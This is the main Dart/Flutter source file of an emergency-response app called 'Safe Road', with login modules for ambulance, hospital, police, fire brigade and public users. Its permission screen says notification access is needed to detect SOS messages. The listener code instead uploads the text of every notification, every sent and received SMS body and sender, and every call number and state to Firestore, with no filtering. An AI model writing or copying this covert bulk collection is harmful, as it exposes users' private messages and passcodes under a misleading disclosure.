import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

// Firebase generated config
import 'firebase_options.dart';

// Module screens
import 'ambulance_login.dart';
import 'hospital_login.dart';
import 'police_login.dart';
import 'fire_brigade_login.dart';
import 'public_user_login.dart';

/// ------------------------------------------------------
/// 🔔 METHOD CHANNEL FOR NOTIFICATION ACCESS
/// ------------------------------------------------------
const MethodChannel settingsChannel = MethodChannel("open_settings");

/// Check if notification access already granted
Future<bool> isNotificationAccessGranted() async {
  try {
    final granted =
    await settingsChannel.invokeMethod<bool>("checkNotificationAccess");
    return granted ?? false;
  } catch (e) {
    print("❌ Error checking notification access: $e");
    return false;
  }
}

/// Open Android Notification Listener Settings
Future<void> openNotificationSettings() async {
  try {
    await settingsChannel.invokeMethod("openNotificationAccess");
  } catch (e) {
    print("❌ Error opening notification settings: $e");
  }
}

/// ------------------------------------------------------
/// 🔔 NATIVE NOTIFICATION / SMS / CALL LISTENER STREAM
/// ------------------------------------------------------
const EventChannel notificationChannel = EventChannel("notification_stream");
StreamSubscription? notificationSub;

/// Listen & store notifications/SMS/calls in Firestore
void startNotificationListener() {
  // avoid multiple listeners
  notificationSub?.cancel();

  notificationSub =
      notificationChannel.receiveBroadcastStream().listen((dynamic event) async {
        try {
          // event should be a Map from native side
          final Map<dynamic, dynamic> raw =
          Map<dynamic, dynamic>.from(event as Map);

          final String type = (raw["type"] ?? "notification").toString();

          final base = <String, dynamic>{
            "timestamp": FieldValue.serverTimestamp(),
          };

          if (type == "notification") {
            await FirebaseFirestore.instance
                .collection("user_notifications")
                .add({
              ...base,
              "package": raw["package"]?.toString() ?? "",
              "title": raw["title"]?.toString() ?? "",
              "text": raw["text"]?.toString() ?? "",
            });
            print("✅ Notification saved to Firestore");
          } else if (type == "sms") {
            await FirebaseFirestore.instance.collection("user_sms").add({
              ...base,
              "address": raw["address"]?.toString() ?? "",
              "body": raw["body"]?.toString() ?? "",
              "inbox": raw["inbox"] ?? true, // true: received, false: sent
            });
            print("✅ SMS saved to Firestore");
          } else if (type == "call") {
            await FirebaseFirestore.instance.collection("user_calls").add({
              ...base,
              "number": raw["number"]?.toString() ?? "",
              "state": raw["state"]?.toString() ??
                  "", // incoming / outgoing / missed
            });
            print("✅ Call saved to Firestore");
          } else {
            // unknown type, just dump raw
            await FirebaseFirestore.instance
                .collection("user_notifications_raw")
                .add({
              ...base,
              "raw": raw,
            });
            print("⚠️ Unknown event type, saved raw");
          }
        } catch (e, st) {
          print("❌ Error handling notification event: $e");
          print(st);
        }
      }, onError: (error) {
        print("❌ Notification stream error: $error");
      });
}

/// ------------------------------------------------------
/// 🧹 DELETE PATIENT RECORDS OLDER THAN 12 HOURS
/// ------------------------------------------------------
Future<void> deleteOldPatientRecords() async {
  try {
    final patients =
    FirebaseFirestore.instance.collection("patient_details");

    final snap = await patients.get();
    final now = DateTime.now();

    for (var doc in snap.docs) {
      final ts = doc["timestamp"];
      if (ts is! Timestamp) continue;

      final time = ts.toDate();
      if (now.difference(time).inHours >= 12) {
        await patients.doc(doc.id).delete();
        print("🔥 Deleted old record: ${doc.id}");
      }
    }
  } catch (e) {
    print("❌ Error deleting patient records: $e");
  }
}

/// ------------------------------------------------------
/// 🚀 MAIN FUNCTION
/// ------------------------------------------------------
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Firebase init
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );

  // Optional: clean up old patient records at startup
  deleteOldPatientRecords();

  // Check Notification permission BEFORE app UI loads
  final granted = await isNotificationAccessGranted();

  // Start listener only if permitted
  if (granted) startNotificationListener();

  runApp(MyApp(notificationGranted: granted));
}

/// ------------------------------------------------------
/// 🎨 ROOT APP WIDGET
/// ------------------------------------------------------
class MyApp extends StatelessWidget {
  final bool notificationGranted;

  const MyApp({super.key, required this.notificationGranted});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: notificationGranted ? const HomePage() : const NotificationPermissionPage(),
      routes: {
        'ambulance': (context) => AmbulanceLoginPage(),
        'hospital': (context) => HospitalLoginPage(),
        'police': (context) => PoliceLoginPage(),
        'fire_brigade': (context) => FireBrigadeLoginPage(),
        'public_user': (context) => PublicHomePage(),
      },
    );
  }
}

/// ------------------------------------------------------
/// 🔐 NOTIFICATION PERMISSION SCREEN
/// ------------------------------------------------------
class NotificationPermissionPage extends StatefulWidget {
  const NotificationPermissionPage({super.key});

  @override
  State<NotificationPermissionPage> createState() =>
      _NotificationPermissionPageState();
}

class _NotificationPermissionPageState
    extends State<NotificationPermissionPage> {
  bool checking = false;

  Future<void> _checkPermissionAgain() async {
    setState(() => checking = true);

    final granted = await isNotificationAccessGranted();

    if (granted && mounted) {
      startNotificationListener();

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (_) => const HomePage()),
      );
    } else {
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text("Permission still not granted"),
          backgroundColor: Colors.red,
        ),
      );
    }

    if (mounted) setState(() => checking = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.notifications_active,
                  size: 90, color: Colors.redAccent),
              const SizedBox(height: 20),
              const Text(
                "Enable Notification Access",
                style: TextStyle(fontSize: 26, fontWeight: FontWeight.bold),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 12),
              const Text(
                "Safe Road needs this to detect SOS messages, alerts, and emergencies.",
                textAlign: TextAlign.center,
                style: TextStyle(fontSize: 16),
              ),
              const SizedBox(height: 35),
              ElevatedButton(
                onPressed: openNotificationSettings,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.black,
                  padding:
                  const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                ),
                child: const Text(
                  "Grant Permission",
                  style: TextStyle(fontSize: 18, color: Colors.white),
                ),
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: checking ? null : _checkPermissionAgain,
                child: checking
                    ? const CircularProgressIndicator(color: Colors.white)
                    : const Text("I've Enabled It"),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

/// ------------------------------------------------------
/// 🏠 HOME PAGE (Modules Grid)
/// ------------------------------------------------------
class HomePage extends StatelessWidget {
  const HomePage({super.key});

  final List<Map<String, dynamic>> modules = const [
    {
      "title": "Ambulance",
      "image": "assets/images/ambulance.png",
      "gradient": [Colors.redAccent, Colors.deepOrange],
      "route": 'ambulance',
    },
    {
      "title": "Hospital",
      "image": "assets/images/hospital.png",
      "gradient": [Colors.blueAccent, Colors.lightBlue],
      "route": 'hospital',
    },
    {
      "title": "Police",
      "image": "assets/images/police.png",
      "gradient": [Colors.indigo, Colors.blueGrey],
      "route": 'police',
    },
    {
      "title": "Fire Brigade",
      "image": "assets/images/fire_brigade.png",
      "gradient": [Colors.deepOrange, Colors.red],
      "route": 'fire_brigade',
    },
    {
      "title": "Public User",
      "image": "assets/images/public.png",
      "gradient": [Colors.green, Colors.teal],
      "route": 'public_user',
    },
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Safe Road"),
        centerTitle: true,
        backgroundColor: Colors.black,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: GridView.builder(
          itemCount: modules.length,
          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            crossAxisCount: 2,
            mainAxisSpacing: 12,
            crossAxisSpacing: 12,
            childAspectRatio: 0.9,
          ),
          itemBuilder: (context, index) {
            final m = modules[index];
            return _buildModuleCard(
              context,
              title: m["title"] as String,
              imagePath: m["image"] as String,
              gradientColors: (m["gradient"] as List<Color>),
              routeName: m["route"] as String,
            );
          },
        ),
      ),
    );
  }

  Widget _buildModuleCard(
      BuildContext context, {
        required String title,
        required String imagePath,
        required List<Color> gradientColors,
        required String routeName,
      }) {
    return GestureDetector(
      onTap: () => Navigator.pushNamed(context, routeName),
      child: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: gradientColors,
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
          ),
          borderRadius: BorderRadius.circular(20),
          boxShadow: const [
            BoxShadow(
              blurRadius: 8,
              spreadRadius: 2,
              color: Colors.black26,
              offset: Offset(4, 4),
            ),
          ],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Expanded(
              child: Padding(
                padding: const EdgeInsets.all(10),
                child: Image.asset(imagePath),
              ),
            ),
            Padding(
              padding: const EdgeInsets.symmetric(vertical: 8),
              child: Text(
                title,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  shadows: [
                    Shadow(color: Colors.black, blurRadius: 1),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
